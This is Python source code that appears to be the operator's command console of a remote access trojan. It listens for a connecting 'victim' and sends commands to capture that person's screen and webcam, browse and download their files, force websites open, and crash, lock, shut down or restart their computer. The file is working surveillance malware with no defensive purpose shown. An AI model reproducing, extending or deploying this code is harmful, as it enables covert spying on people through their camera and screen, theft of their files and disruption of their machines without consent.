import socket
import os
import base64
from vidstream import StreamingServer
import threading
import time

#ip = "private ipv4"
ip = "127.0.0.1"
port=8080
restart = True

"""
passw = input("Enter password: ")
encodedBytes = base64.b64encode(passw.encode("utf-8"))
encodedStr = str(encodedBytes, "utf-8")
workingpass = "c2FwcmF0"

if encodedStr == workingpass:
    os.system("cls")
else:
    exit()
"""

def main():
        conn, sock = connect()
        while True:
            command = input(str("Command >> "))
            if command == "exit":
                exitt(conn, command)
            elif command == "username":
                username(conn, command)
            elif command == "screenshare":
                screenshare(conn, command, sock)
                conn, sock = connect()
            elif command == "camera":
                camera(conn, command, sock)
                conn, sock = connect()
            elif command == "website":
                website(conn, command)
            elif command == "crash":
                crash(conn, command)
            elif command == "shutdown":
                shutdown(conn, command)
            elif command == "lock":
                lock(conn, command)
            elif command == "restart":
                restart(conn, command)
            elif command == "getcwd":
                getcwd(conn, command)
            elif command == "files":
                files(conn, command)
            elif command == "download":
                download(conn, command)
            elif command == "upload":
                print("nope")
            elif command == "remove":
                print("nope")
            elif command == "help":
                print("exit, username, screenshare, website, crash, shutdown, lock, restart, getcwd, files, download, upload, remove")
        conn.close()


def connect():
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    address = (ip,port)
    sock.bind(address)
    sock.listen()
    print("[+] listening")
    conn, ipvictim = sock.accept()
    print("[+] Connected")
    return conn, sock



def download(conn, command):
    conn.send(command.encode())
    ftd = input("Enter file location >> ")
    fts = input("Enter save location >> ")
    conn.send(ftd.encode())
    filedata = conn.recv(1000000)
    new_file = open(fts, 'wb')
    new_file.write(filedata)
    new_file.close()


def files(conn, command):
    conn.send(command.encode())
    dir = input("Enter directory >> ")
    conn.send(dir.encode())
    output = conn.recv(1024)
    output = output.decode()
    print(output)

def getcwd(conn, command):
    conn.send(command.encode())
    cwd = conn.recv(1024)
    cwd = cwd.decode()
    print(cwd)



def exitt(conn, command):
    conn.send(command.encode())
    exit()



def username(conn, command):
    conn.send(command.encode())
    newuser = conn.recv(1024)
    print(newuser.decode())



def screenshare(conn, command, sock):
    conn.send(command.encode())
    sock.close()
    conn.close()
    receiver = StreamingServer(ip, 8080)
    t = threading.Thread(target=receiver.start_server)
    t.start()
    time.sleep(15)
    receiver.stop_server()

def camera(conn, command, sock):
    conn.send(command.encode())
    sock.close()
    conn.close()
    receiver = StreamingServer(ip, 8080)
    t = threading.Thread(target=receiver.start_server)
    t.start()
    time.sleep(15)
    receiver.stop_server()


def website(conn, command):
    conn.send(command.encode())
    website = input("Website >> ")
    conn.send(website.encode())



def crash(conn, command):
    conn.send(command.encode())



def shutdown(conn, command):
    conn.send(command.encode())



def lock(conn, command):
    conn.send(command.encode())



def restart(conn, command):
    conn.send(command.encode())

main()
